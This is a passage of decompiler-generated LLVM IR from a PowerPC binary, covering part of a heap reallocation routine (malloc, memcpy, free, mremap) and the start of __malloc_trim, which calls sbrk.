dec_label_pc_1000bb40:                            ; preds = %dec_label_pc_1000bae8, %dec_label_pc_1000bb00, %dec_label_pc_1000bae0
  %v0_1000bb40 = load i32, i32* @r24, align 4
  %v1_1000bb40 = add i32 %v0_1000bb40, -7
  store i32 %v1_1000bb40, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 268483404, i32* @lr, align 4
  %v1_1000bb48 = call i32 @malloc(i32 %v1_1000bb40)
  store i32 %v1_1000bb48, i32* @r3, align 4
  store i32 %v1_1000bb48, i32* @r11, align 4
  %v3_1000bb4c = icmp eq i32 %v1_1000bb48, 0
  br i1 %v3_1000bb4c, label %dec_label_pc_1000bd38, label %dec_label_pc_1000bb54

dec_label_pc_1000bb54:                            ; preds = %dec_label_pc_1000bb40
  %v1_1000bb54 = add i32 %v1_1000bb48, -8
  store i32 %v1_1000bb54, i32* %r29.global-to-local, align 4
  %v1_1000bb58 = load i32, i32* @r31, align 4
  %v4_1000bb58 = icmp eq i32 %v1_1000bb54, %v1_1000bb58
  store i1 %v4_1000bb58, i1* %cr7_eq.global-to-local, align 1
  %v1_1000bb5c = add i32 %v1_1000bb48, -4
  %v2_1000bb5c = inttoptr i32 %v1_1000bb5c to i32*
  %v3_1000bb5c = load i32, i32* %v2_1000bb5c, align 4
  %v1_1000bb60 = call i32 @__asm_rlwinm(i32 %v3_1000bb5c, i32 0, i32 0, i32 29)
  %v2_1000bb64 = add i32 %v1_1000bb60, %v1_1000ba74
  store i32 %v2_1000bb64, i32* %r9.global-to-local, align 4
  %v0_1000bb68 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000bb68, label %dec_label_pc_1000bbf8, label %dec_label_pc_1000bb6c

dec_label_pc_1000bb6c:                            ; preds = %dec_label_pc_1000bb54
  %v1_1000bb6c = add i32 %v1_1000ba74, -4
  store i32 %v1_1000bb6c, i32* @r5, align 4
  %v1_1000bb70 = udiv i32 %v1_1000bb6c, 4
  store i32 %v1_1000bb70, i32* %r9.global-to-local, align 4
  %v1_1000bb74 = icmp ult i32 %v1_1000bb6c, 36
  %tmp14 = and i32 %v1_1000bb6c, -4
  %tmp15 = icmp eq i32 %tmp14, 36
  store i1 %tmp15, i1* %cr7_eq.global-to-local, align 1
  %v2_1000bb78 = or i1 %v1_1000bb74, %tmp15
  %v0_1000bb88 = load i32, i32* @r30, align 4
  br i1 %v2_1000bb78, label %dec_label_pc_1000bb88, label %dec_label_pc_1000bb7c

dec_label_pc_1000bb7c:                            ; preds = %dec_label_pc_1000bb6c
  store i32 %v0_1000bb88, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1000bb84.507 to i32), i32* @lr, align 4
  %v0_1000bb80 = call i32 @memcpy()
  store i32 %v0_1000bb80, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bbe8

dec_label_pc_1000bb88:                            ; preds = %dec_label_pc_1000bb6c
  %v1_1000bb88 = inttoptr i32 %v0_1000bb88 to i32*
  %v2_1000bb88 = load i32, i32* %v1_1000bb88, align 4
  %v1_1000bb8c = icmp ult i32 %v1_1000bb6c, 16
  %tmp16 = and i32 %v1_1000bb6c, -4
  %tmp17 = icmp eq i32 %tmp16, 16
  store i1 %tmp17, i1* %cr7_eq.global-to-local, align 1
  %v1_1000bb90 = load i32, i32* @r11, align 4
  %v2_1000bb90 = inttoptr i32 %v1_1000bb90 to i32*
  store i32 %v2_1000bb88, i32* %v2_1000bb90, align 4
  %v0_1000bb94 = load i32, i32* @r30, align 4
  %v1_1000bb94 = add i32 %v0_1000bb94, 4
  %v2_1000bb94 = inttoptr i32 %v1_1000bb94 to i32*
  %v3_1000bb94 = load i32, i32* %v2_1000bb94, align 4
  %v1_1000bb98 = load i32, i32* @r11, align 4
  %v2_1000bb98 = add i32 %v1_1000bb98, 4
  %v3_1000bb98 = inttoptr i32 %v2_1000bb98 to i32*
  store i32 %v3_1000bb94, i32* %v3_1000bb98, align 4
  %v0_1000bb9c = load i32, i32* @r30, align 4
  %v1_1000bb9c = add i32 %v0_1000bb9c, 8
  %v2_1000bb9c = inttoptr i32 %v1_1000bb9c to i32*
  %v3_1000bb9c = load i32, i32* %v2_1000bb9c, align 4
  %v1_1000bba0 = load i32, i32* @r11, align 4
  %v2_1000bba0 = add i32 %v1_1000bba0, 8
  %v3_1000bba0 = inttoptr i32 %v2_1000bba0 to i32*
  store i32 %v3_1000bb9c, i32* %v3_1000bba0, align 4
  %v2_1000bba4 = or i1 %v1_1000bb8c, %tmp17
  br i1 %v2_1000bba4, label %dec_label_pc_1000bbe8, label %dec_label_pc_1000bba8

dec_label_pc_1000bba8:                            ; preds = %dec_label_pc_1000bb88
  %v0_1000bba8 = load i32, i32* @r30, align 4
  %v1_1000bba8 = add i32 %v0_1000bba8, 12
  %v2_1000bba8 = inttoptr i32 %v1_1000bba8 to i32*
  %v3_1000bba8 = load i32, i32* %v2_1000bba8, align 4
  %v0_1000bbac = load i32, i32* %r9.global-to-local, align 4
  %v3_1000bbac = icmp eq i32 %v0_1000bbac, 6
  store i1 %v3_1000bbac, i1* %cr7_eq.global-to-local, align 1
  %v1_1000bbb0 = load i32, i32* @r11, align 4
  %v2_1000bbb0 = add i32 %v1_1000bbb0, 12
  %v3_1000bbb0 = inttoptr i32 %v2_1000bbb0 to i32*
  store i32 %v3_1000bba8, i32* %v3_1000bbb0, align 4
  %v0_1000bbb4 = load i32, i32* @r30, align 4
  %v1_1000bbb4 = add i32 %v0_1000bbb4, 16
  %v2_1000bbb4 = inttoptr i32 %v1_1000bbb4 to i32*
  %v3_1000bbb4 = load i32, i32* %v2_1000bbb4, align 4
  %v1_1000bbb8 = load i32, i32* @r11, align 4
  %v2_1000bbb8 = add i32 %v1_1000bbb8, 16
  %v3_1000bbb8 = inttoptr i32 %v2_1000bbb8 to i32*
  store i32 %v3_1000bbb4, i32* %v3_1000bbb8, align 4
  %tmp13 = icmp ult i32 %v0_1000bbac, 7
  br i1 %tmp13, label %dec_label_pc_1000bbe8, label %dec_label_pc_1000bbc0

dec_label_pc_1000bbc0:                            ; preds = %dec_label_pc_1000bba8
  %v0_1000bbc0 = load i32, i32* @r30, align 4
  %v1_1000bbc0 = add i32 %v0_1000bbc0, 20
  %v2_1000bbc0 = inttoptr i32 %v1_1000bbc0 to i32*
  %v3_1000bbc0 = load i32, i32* %v2_1000bbc0, align 4
  %v0_1000bbc4 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000bbc4 = icmp eq i32 %v0_1000bbc4, 9
  store i1 %v3_1000bbc4, i1* %cr7_eq.global-to-local, align 1
  %v1_1000bbc8 = load i32, i32* @r11, align 4
  %v2_1000bbc8 = add i32 %v1_1000bbc8, 20
  %v3_1000bbc8 = inttoptr i32 %v2_1000bbc8 to i32*
  store i32 %v3_1000bbc0, i32* %v3_1000bbc8, align 4
  %v0_1000bbcc = load i32, i32* @r30, align 4
  %v1_1000bbcc = add i32 %v0_1000bbcc, 24
  %v2_1000bbcc = inttoptr i32 %v1_1000bbcc to i32*
  %v3_1000bbcc = load i32, i32* %v2_1000bbcc, align 4
  %v1_1000bbd0 = load i32, i32* @r11, align 4
  %v2_1000bbd0 = add i32 %v1_1000bbd0, 24
  %v3_1000bbd0 = inttoptr i32 %v2_1000bbd0 to i32*
  store i32 %v3_1000bbcc, i32* %v3_1000bbd0, align 4
  br i1 %v3_1000bbc4, label %dec_label_pc_1000bbd8, label %dec_label_pc_1000bbe8

dec_label_pc_1000bbd8:                            ; preds = %dec_label_pc_1000bbc0
  %v0_1000bbd8 = load i32, i32* @r30, align 4
  %v1_1000bbd8 = add i32 %v0_1000bbd8, 28
  %v2_1000bbd8 = inttoptr i32 %v1_1000bbd8 to i32*
  %v3_1000bbd8 = load i32, i32* %v2_1000bbd8, align 4
  %v1_1000bbdc = load i32, i32* @r11, align 4
  %v2_1000bbdc = add i32 %v1_1000bbdc, 28
  %v3_1000bbdc = inttoptr i32 %v2_1000bbdc to i32*
  store i32 %v3_1000bbd8, i32* %v3_1000bbdc, align 4
  %v0_1000bbe0 = load i32, i32* @r30, align 4
  %v1_1000bbe0 = add i32 %v0_1000bbe0, 32
  %v2_1000bbe0 = inttoptr i32 %v1_1000bbe0 to i32*
  %v3_1000bbe0 = load i32, i32* %v2_1000bbe0, align 4
  %v1_1000bbe4 = load i32, i32* @r11, align 4
  %v2_1000bbe4 = add i32 %v1_1000bbe4, 32
  %v3_1000bbe4 = inttoptr i32 %v2_1000bbe4 to i32*
  store i32 %v3_1000bbe0, i32* %v3_1000bbe4, align 4
  br label %dec_label_pc_1000bbe8

dec_label_pc_1000bbe8:                            ; preds = %dec_label_pc_1000bbc0, %dec_label_pc_1000bba8, %dec_label_pc_1000bb88, %dec_label_pc_1000bb7c, %dec_label_pc_1000bbd8
  %v0_1000bbe8 = load i32, i32* @r30, align 4
  store i32 %v0_1000bbe8, i32* @r3, align 4
  %v0_1000bbec = load i32, i32* %r29.global-to-local, align 4
  %v1_1000bbec = add i32 %v0_1000bbec, 8
  store i32 %v1_1000bbec, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1000bbf4.508 to i32), i32* @lr, align 4
  %v0_1000bbf0 = call i32 @free()
  store i32 %v0_1000bbf0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bd38

dec_label_pc_1000bbf8:                            ; preds = %dec_label_pc_1000ba7c, %dec_label_pc_1000bb54, %dec_label_pc_1000bb34
  %v0_1000bc0c = phi i32 [ %v1_1000ba74, %dec_label_pc_1000ba7c ], [ %v2_1000bb64, %dec_label_pc_1000bb54 ], [ %v1_1000bbf8.pre, %dec_label_pc_1000bb34 ]
  %v0_1000bbf8 = load i32, i32* @r24, align 4
  %v2_1000bbf8 = sub i32 %v0_1000bc0c, %v0_1000bbf8
  store i32 %v2_1000bbf8, i32* @r11, align 4
  %v0_1000bbfc = load i32, i32* @r25, align 4
  %v1_1000bbfc = add i32 %v0_1000bbfc, 4
  %v2_1000bbfc = inttoptr i32 %v1_1000bbfc to i32*
  %v3_1000bbfc = load i32, i32* %v2_1000bbfc, align 4
  %v2_1000bc00 = icmp ugt i32 %v2_1000bbf8, 15
  %v3_1000bc00 = icmp eq i32 %v2_1000bbf8, 15
  store i1 %v3_1000bc00, i1* %cr7_eq.global-to-local, align 1
  %v1_1000bc28 = urem i32 %v3_1000bbfc, 2
  br i1 %v2_1000bc00, label %dec_label_pc_1000bc28, label %dec_label_pc_1000bc08

dec_label_pc_1000bc08:                            ; preds = %dec_label_pc_1000bbf8
  %v2_1000bc0c = or i32 %v1_1000bc28, %v0_1000bc0c
  %v2_1000bc10 = add i32 %v0_1000bbfc, %v0_1000bc0c
  store i32 %v2_1000bc10, i32* %r9.global-to-local, align 4
  store i32 %v2_1000bc0c, i32* %v2_1000bbfc, align 4
  %v0_1000bc18 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bc18 = add i32 %v0_1000bc18, 4
  %v2_1000bc18 = inttoptr i32 %v1_1000bc18 to i32*
  %v3_1000bc18 = load i32, i32* %v2_1000bc18, align 4
  %v1_1000bc1c = or i32 %v3_1000bc18, 1
  store i32 %v1_1000bc1c, i32* %v2_1000bc18, align 4
  br label %dec_label_pc_1000bc58

dec_label_pc_1000bc28:                            ; preds = %dec_label_pc_1000bbf8
  %v2_1000bc2c = add i32 %v0_1000bbfc, %v0_1000bbf8
  store i32 %v2_1000bc2c, i32* %r3.global-to-local, align 4
  %v2_1000bc30 = or i32 %v1_1000bc28, %v0_1000bbf8
  %v1_1000bc34 = or i32 %v2_1000bbf8, 1
  store i32 %v1_1000bc34, i32* %r9.global-to-local, align 4
  store i32 %v2_1000bc30, i32* %v2_1000bbfc, align 4
  %v0_1000bc3c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bc3c = load i32, i32* %r3.global-to-local, align 4
  %v2_1000bc3c = add i32 %v1_1000bc3c, 4
  %v3_1000bc3c = inttoptr i32 %v2_1000bc3c to i32*
  store i32 %v0_1000bc3c, i32* %v3_1000bc3c, align 4
  %v0_1000bc40 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000bc40 = load i32, i32* @r11, align 4
  %v2_1000bc40 = add i32 %v1_1000bc40, %v0_1000bc40
  store i32 %v2_1000bc40, i32* %r9.global-to-local, align 4
  %v1_1000bc44 = add i32 %v0_1000bc40, 8
  store i32 %v1_1000bc44, i32* @r3, align 4
  %v1_1000bc48 = add i32 %v2_1000bc40, 4
  %v2_1000bc48 = inttoptr i32 %v1_1000bc48 to i32*
  %v3_1000bc48 = load i32, i32* %v2_1000bc48, align 4
  %v1_1000bc4c = or i32 %v3_1000bc48, 1
  store i32 %v1_1000bc4c, i32* %v2_1000bc48, align 4
  store i32 268483672, i32* @lr, align 4
  %v0_1000bc54 = call i32 @free()
  store i32 %v0_1000bc54, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bc58

dec_label_pc_1000bc58:                            ; preds = %dec_label_pc_1000bc08, %dec_label_pc_1000bc28
  %v0_1000bc58 = load i32, i32* @r25, align 4
  %v1_1000bc58 = add i32 %v0_1000bc58, 8
  store i32 %v1_1000bc58, i32* @r29, align 4
  br label %dec_label_pc_1000bd38

dec_label_pc_1000bc60:                            ; preds = %dec_label_pc_1000ba68
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_1000bc64 = load i32, i32* @r30, align 4
  %v1_1000bc64 = add i32 %v0_1000bc64, -8
  %v2_1000bc64 = inttoptr i32 %v1_1000bc64 to i32*
  %v3_1000bc64 = load i32, i32* %v2_1000bc64, align 4
  store i32 %v3_1000bc64, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r26, align 4
  store i32 %v0_1000bc64, i32* @r29, align 4
  %v3_1000bc70 = load i32, i32* @global_var_10023d88.490, align 4
  %v1_1000bc74 = add i32 %v3_1000bc64, 4
  %v1_1000bc78 = add i32 %v3_1000bc70, -1
  store i32 %v1_1000bc78, i32* %r9.global-to-local, align 4
  %v2_1000bc7c = add i32 %v1_1000bc74, %v1_1000bc78
  %v1_1000bc80 = load i32, i32* @r24, align 4
  %v2_1000bc80 = add i32 %v2_1000bc7c, %v1_1000bc80
  %v2_1000bc84 = sub i32 0, %v3_1000bc70
  %v3_1000bc84 = and i32 %v2_1000bc80, %v2_1000bc84
  store i32 %v3_1000bc84, i32* %r27.global-to-local, align 4
  %v2_1000bc88 = sub i32 %v3_1000bc84, %v3_1000bc64
  store i32 %v2_1000bc88, i32* @r23, align 4
  %v4_1000bc8c = icmp eq i32 %v1_1000ba74, %v2_1000bc88
  store i1 %v4_1000bc8c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000bc8c, label %dec_label_pc_1000bd38, label %dec_label_pc_1000bc94

dec_label_pc_1000bc94:                            ; preds = %dec_label_pc_1000bc60
  %v1_1000bc94 = load i32, i32* @r25, align 4
  %v2_1000bc94 = sub i32 %v1_1000bc94, %v3_1000bc64
  store i32 %v2_1000bc94, i32* %r3.global-to-local, align 4
  %v2_1000bc98 = add i32 %v3_1000bc64, %v1_1000ba74
  store i32 268483756, i32* @lr, align 4
  %v5_1000bca8 = call i32 @mremap(i32 %v2_1000bc94, i32 %v2_1000bc98, i32 %v3_1000bc84, i32 1, i32 %v1_1000bc78)
  store i32 %v5_1000bca8, i32* %r3.global-to-local, align 4
  %v3_1000bcac = icmp eq i32 %v5_1000bca8, -1
  store i1 %v3_1000bcac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000bcac, label %dec_label_pc_1000bd00, label %dec_label_pc_1000bcb4

dec_label_pc_1000bcb4:                            ; preds = %dec_label_pc_1000bc94
  %v0_1000bcb4 = load i32, i32* @r23, align 4
  %v1_1000bcb4 = or i32 %v0_1000bcb4, 2
  %v1_1000bcb8 = load i32, i32* @r31, align 4
  %v2_1000bcb8 = add i32 %v1_1000bcb8, %v5_1000bca8
  store i32 %v2_1000bcb8, i32* %r3.global-to-local, align 4
  %v2_1000bcbc = add i32 %v2_1000bcb8, 4
  %v3_1000bcbc = inttoptr i32 %v2_1000bcbc to i32*
  store i32 %v1_1000bcb4, i32* %v3_1000bcbc, align 4
  %v3_1000bcc0 = load i32, i32* @global_var_10023d90.496, align 4
  %v3_1000bcc4 = load i32, i32* @global_var_10023d9c.497, align 4
  store i32 %v3_1000bcc4, i32* %r9.global-to-local, align 4
  %v2_1000bcc8 = sub i32 %v3_1000bcc0, %v1_1000ba74
  %v1_1000bccc = load i32, i32* %r27.global-to-local, align 4
  %v2_1000bccc = add i32 %v1_1000bccc, %v2_1000bcc8
  %v3_1000bcd0 = icmp ugt i32 %v2_1000bccc, %v3_1000bcc4
  %v4_1000bcd0 = icmp eq i32 %v2_1000bccc, %v3_1000bcc4
  store i1 %v4_1000bcd0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_1000bccc, i32* @global_var_10023d90.496, align 4
  br i1 %v3_1000bcd0, label %dec_label_pc_1000bcdc, label %dec_label_pc_1000bce0

dec_label_pc_1000bcdc:                            ; preds = %dec_label_pc_1000bcb4
  store i32 %v2_1000bccc, i32* @global_var_10023d9c.497, align 4
  br label %dec_label_pc_1000bce0

dec_label_pc_1000bce0:                            ; preds = %dec_label_pc_1000bcb4, %dec_label_pc_1000bcdc
  %v3_1000bce0 = load i32, i32* @global_var_10023d94.498, align 4
  %v3_1000bce4 = load i32, i32* @global_var_10023da0.499, align 4
  store i32 %v3_1000bce4, i32* %r9.global-to-local, align 4
  %v2_1000bce8 = add i32 %v3_1000bce0, %v2_1000bccc
  %v3_1000bcec = icmp ugt i32 %v2_1000bce8, %v3_1000bce4
  %v4_1000bcec = icmp eq i32 %v2_1000bce8, %v3_1000bce4
  store i1 %v4_1000bcec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000bcec, label %dec_label_pc_1000bcf4, label %dec_label_pc_1000bcf8

dec_label_pc_1000bcf4:                            ; preds = %dec_label_pc_1000bce0
  store i32 %v2_1000bce8, i32* @global_var_10023da0.499, align 4
  br label %dec_label_pc_1000bcf8

dec_label_pc_1000bcf8:                            ; preds = %dec_label_pc_1000bce0, %dec_label_pc_1000bcf4
  %v0_1000bcf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000bcf8 = add i32 %v0_1000bcf8, 8
  store i32 %v1_1000bcf8, i32* @r29, align 4
  br label %dec_label_pc_1000bd38

dec_label_pc_1000bd00:                            ; preds = %dec_label_pc_1000bc94
  %v0_1000bd00 = load i32, i32* @r24, align 4
  %v1_1000bd00 = add i32 %v0_1000bd00, 4
  %v0_1000bd04 = load i32, i32* @r30, align 4
  store i32 %v0_1000bd04, i32* @r31, align 4
  %v2_1000bd08 = icmp ult i32 %v1_1000ba74, %v1_1000bd00
  %v4_1000bd08 = icmp eq i32 %v1_1000ba74, %v1_1000bd00
  store i1 %v4_1000bd08, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000bd08, label %dec_label_pc_1000bd10, label %dec_label_pc_1000bd34

dec_label_pc_1000bd10:                            ; preds = %dec_label_pc_1000bd00
  %v1_1000bd10 = add i32 %v0_1000bd00, -7
  store i32 %v1_1000bd10, i32* %r3.global-to-local, align 4
  store i32 268483864, i32* @lr, align 4
  %v1_1000bd14 = call i32 @malloc(i32 %v1_1000bd10)
  store i32 %v1_1000bd14, i32* @r3, align 4
  store i32 %v1_1000bd14, i32* @r31, align 4
  %v3_1000bd18 = icmp eq i32 %v1_1000bd14, 0
  br i1 %v3_1000bd18, label %dec_label_pc_1000bd34, label %dec_label_pc_1000bd20

dec_label_pc_1000bd20:                            ; preds = %dec_label_pc_1000bd10
  %v1_1000bd20 = add i32 %v1_1000ba74, -8
  store i32 %v1_1000bd20, i32* @r5, align 4
  %v0_1000bd24 = load i32, i32* @r30, align 4
  store i32 %v0_1000bd24, i32* @r4, align 4
  store i32 268483884, i32* @lr, align 4
  %v0_1000bd28 = call i32 @memcpy()
  %v0_1000bd2c = load i32, i32* @r30, align 4
  store i32 %v0_1000bd2c, i32* @r3, align 4
  store i32 268483892, i32* @lr, align 4
  %v0_1000bd30 = call i32 @free()
  store i32 %v0_1000bd30, i32* %r3.global-to-local, align 4
  %v0_1000bd34.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000bd34

dec_label_pc_1000bd34:                            ; preds = %dec_label_pc_1000bd00, %dec_label_pc_1000bd10, %dec_label_pc_1000bd20
  %v0_1000bd34 = phi i32 [ %v0_1000bd04, %dec_label_pc_1000bd00 ], [ 0, %dec_label_pc_1000bd10 ], [ %v0_1000bd34.pre, %dec_label_pc_1000bd20 ]
  store i32 %v0_1000bd34, i32* @r29, align 4
  br label %dec_label_pc_1000bd38

dec_label_pc_1000bd38:                            ; preds = %dec_label_pc_1000bc60, %dec_label_pc_1000bb40, %dec_label_pc_1000bc58, %dec_label_pc_1000bbe8, %dec_label_pc_1000bab8, %dec_label_pc_1000bcf8, %dec_label_pc_1000bd34
  store i32 %v2_1000ba18, i32* %r3.global-to-local, align 4
  store i32 268483908, i32* @lr, align 4
  %v3_1000bd40 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-56, i32 1)
  store i32 %v3_1000bd40, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bd44

dec_label_pc_1000bd44:                            ; preds = %dec_label_pc_1000ba34, %dec_label_pc_1000b9f8, %dec_label_pc_1000b9e0, %dec_label_pc_1000bd38
  %v0_1000bd48 = load i32, i32* @r29, align 4
  store i32 %v0_1000bd48, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000bd48

; uselistorder directives
  uselistorder i32 %v1_1000bd00, { 1, 0 }
  uselistorder i32 %v2_1000bce8, { 0, 2, 1 }
  uselistorder i32 %v3_1000bce4, { 1, 0, 2 }
  uselistorder i32 %v2_1000bccc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_1000bcc4, { 1, 0, 2 }
  uselistorder i32 %v1_1000bc78, { 1, 0, 2 }
  uselistorder i32 %v0_1000bc40, { 1, 0 }
  uselistorder i32 %v1_1000bc28, { 1, 0 }
  uselistorder i32 %v2_1000bbf8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000bb88, { 1, 0 }
  uselistorder i32 %v1_1000bb6c, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_1000bb04, { 1, 0, 2 }
  uselistorder i32 %v1_1000baf8, { 1, 0 }
  uselistorder i32 %v0_1000bac0, { 1, 0 }
  uselistorder i32 %v2_1000baac, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000ba74, { 7, 9, 8, 6, 0, 12, 5, 14, 1, 2, 3, 4, 13, 11, 10, 15 }
  uselistorder i32* %r9.global-to-local, { 21, 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19 }
  uselistorder i32* %r3.global-to-local, { 19, 1, 20, 0, 21, 22, 23, 11, 2, 12, 3, 4, 5, 13, 14, 6, 15, 7, 16, 9, 8, 17, 18, 10 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2, 3 }
  uselistorder i1* %cr7_eq.global-to-local, { 19, 20, 21, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 -33, { 0, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bd44, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000bd38, { 6, 5, 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_1000bd34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bcf8, { 1, 0 }
  uselistorder label %dec_label_pc_1000bce0, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc58, { 1, 0 }
  uselistorder label %dec_label_pc_1000bbf8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000bbe8, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000bb40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000bb34, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb30, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba68, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v1_1000bd70 = add i32 %arg2, 44
  %v2_1000bd70 = inttoptr i32 %v1_1000bd70 to i32*
  %v3_1000bd70 = load i32, i32* %v2_1000bd70, align 4
  store i32 %v3_1000bd70, i32* %r9.global-to-local, align 4
  %v1_1000bd74 = add i32 %arg2, 860
  %v2_1000bd74 = inttoptr i32 %v1_1000bd74 to i32*
  %v3_1000bd74 = load i32, i32* %v2_1000bd74, align 4
  store i32 %v3_1000bd74, i32* @r11, align 4
  %v1_1000bd78 = add i32 %v3_1000bd70, 4
  %v2_1000bd78 = inttoptr i32 %v1_1000bd78 to i32*
  %v3_1000bd78 = load i32, i32* %v2_1000bd78, align 4
  %v1_1000bd7c = add i32 %v3_1000bd74, -17
  store i32 %v1_1000bd7c, i32* %r9.global-to-local, align 4
  %v1_1000bd80 = call i32 @__asm_rlwinm(i32 %v3_1000bd78, i32 0, i32 0, i32 29)
  store i32 %v1_1000bd80, i32* @r29, align 4
  %v2_1000bd84 = sub i32 %v1_1000bd80, %arg1
  %v2_1000bd88 = add i32 %v2_1000bd84, %v1_1000bd7c
  %v1_1000bd8c = load i32, i32* @r11, align 4
  %v2_1000bd8c = udiv i32 %v2_1000bd88, %v1_1000bd8c
  %v1_1000bd90 = add i32 %v2_1000bd8c, -1
  store i32 %v1_1000bd90, i32* %r9.global-to-local, align 4
  %v2_1000bd94 = mul i32 %v1_1000bd90, %v1_1000bd8c
  store i32 %v2_1000bd94, i32* @r28, align 4
  %v5_1000bd94 = icmp eq i32 %v2_1000bd94, 0
  store i1 %v5_1000bd94, i1* @cr0_eq, align 1
  %tmp4 = icmp slt i32 %v2_1000bd94, 1
  br i1 %tmp4, label %dec_label_pc_1000bdfc, label %dec_label_pc_1000bd9c

dec_label_pc_1000bd9c:                            ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268484004, i32* @lr, align 4
  %v1_1000bda0 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1000bda0, i32* %r3.global-to-local, align 4
  %v0_1000bda4 = load i32, i32* @r30, align 4
  %v1_1000bda4 = add i32 %v0_1000bda4, 44
  %v2_1000bda4 = inttoptr i32 %v1_1000bda4 to i32*
  %v3_1000bda4 = load i32, i32* %v2_1000bda4, align 4
  store i32 %v1_1000bda0, i32* @r31, align 4
  %v2_1000bdac = add i32 %v3_1000bda4, %v1_1000bd80
  %v4_1000bdb0 = icmp eq i32 %v1_1000bda0, %v2_1000bdac
  br i1 %v4_1000bdb0, label %dec_label_pc_1000bdb8, label %dec_label_pc_1000bdfc

dec_label_pc_1000bdb8:                            ; preds = %dec_label_pc_1000bd9c
  %v0_1000bdb8 = load i32, i32* @r28, align 4
  %v1_1000bdb8 = sub i32 0, %v0_1000bdb8
  store i32 %v1_1000bdb8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000bdc0.509 to i32), i32* @lr, align 4
  %v1_1000bdbc = call i32 @__GI_sbrk(i32 %v1_1000bdb8)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268484040, i32* @lr, align 4
  %v1_1000bdc4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1000bdc4, i32* %r3.global-to-local, align 4
  %v3_1000bdc8 = icmp eq i32 %v1_1000bdc4, -1
  br i1 %v3_1000bdc8, label %dec_label_pc_1000bdfc, label %dec_label_pc_1000bdd0

dec_label_pc_1000bdd0:                            ; preds = %dec_label_pc_1000bdb8
  %v1_1000bdd0 = load i32, i32* @r31, align 4
  %v2_1000bdd0 = sub i32 %v1_1000bdd0, %v1_1000bdc4
  %v5_1000bdd0 = icmp eq i32 %v2_1000bdd0, 0
  store i1 %v5_1000bdd0, i1* @cr0_eq, align 1
  br i1 %v5_1000bdd0, label %dec_label_pc_1000bdfc, label %dec_label_pc_1000bdd8

dec_label_pc_1000bdd8:                            ; preds = %dec_label_pc_1000bdd0
  %v0_1000bdd8 = load i32, i32* @r30, align 4
  %v1_1000bdd8 = add i32 %v0_1000bdd8, 872
  %v2_1000bdd8 = inttoptr i32 %v1_1000bdd8 to i32*
  %v3_1000bdd8 = load i32, i32* %v2_1000bdd8, align 4
  %v2_1000bddc = sub i32 %v1_1000bd80, %v2_1000bdd0
  store i32 %v2_1000bddc, i32* %r9.global-to-local, align 4
  %v1_1000bde0 = add i32 %v0_1000bdd8, 44
  %v2_1000bde0 = inttoptr i32 %v1_1000bde0 to i32*
  %v3_1000bde0 = load i32, i32* %v2_1000bde0, align 4
  store i32 %v3_1000bde0, i32* @r11, align 4
  %v1_1000bde4 = or i32 %v2_1000bddc, 1
  store i32 %v1_1000bde4, i32* %r9.global-to-local, align 4
  %v2_1000bde8 = sub i32 %v3_1000bdd8, %v2_1000bdd0
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v2_1000bde8, i32* %v2_1000bdd8, align 4
  %v0_1000bdf4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bdf4 = load i32, i32* @r11, align 4
  %v2_1000bdf4 = add i32 %v1_1000bdf4, 4
  %v3_1000bdf4 = inttoptr i32 %v2_1000bdf4 to i32*
